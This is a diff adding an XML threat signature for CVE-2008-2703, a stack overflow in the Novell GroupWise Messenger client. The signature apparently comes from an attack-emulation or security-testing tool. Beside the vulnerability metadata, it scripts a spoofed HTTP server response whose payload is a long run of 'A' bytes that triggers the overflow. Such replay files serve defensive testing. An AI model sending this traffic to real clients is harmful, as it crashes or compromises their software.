@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell GroupWise Messenger HTTP Response Handling Stack Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in Novell GroupWise Messenger product. The flaw is due to improper handling of crafted HTTP responses. An unauthenticated remote attacker can exploit this vulnerability by sending spoofed HTTP responses to the target host. Successful attack could allow for arbitrary code execution with privileges of the currently logged in user. In an attack case where code injection is not successful, the affected application will terminate. In a more sophisticated attack scenario where code injection is successful, the behaviour of the target host is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the current user."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Novell_GroupWise_Messenger_Client_for_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Novell_GroupWise_Messenger_Client_for_Windows_Prior_to_2.0.3_Hot_Patch_1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-2703"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="bdd9d21d579f6ef44938d73e1cbc0e8e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634002892595762781"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264674602" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="Y"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="O">
+      <for index="Y"/>
+      <for index="Z"/>
+    </for>
+    <for index="P">
+      <for index="Y"/>
+      <for index="Z"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="O" Count="">
+    <Ethernet srcMac="00:0C:29:DE:4A:A6" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0041" Identification="320D" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6725" srcIP="172.16.8.98" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1034" destPort="$HTTPdestPort" SeqNumber="7C0511ED" AckNumber="26C281BA" HeaderLength="05" WindowSize="FAF0" Checksum="5FD3" UrgentPointer="0000" Options="" Payload="486F73743A203137322E31362E312E323A383330300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="P" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:DE:4A:A6" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="FE92" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D504" srcIP="$destIP" destIP="172.16.8.98" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1034" SeqNumber="26C281BA" AckNumber="7C0511ED" HeaderLength="05" WindowSize="16D0" Checksum="C2D2" UrgentPointer="0000" Options="" Payload="4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
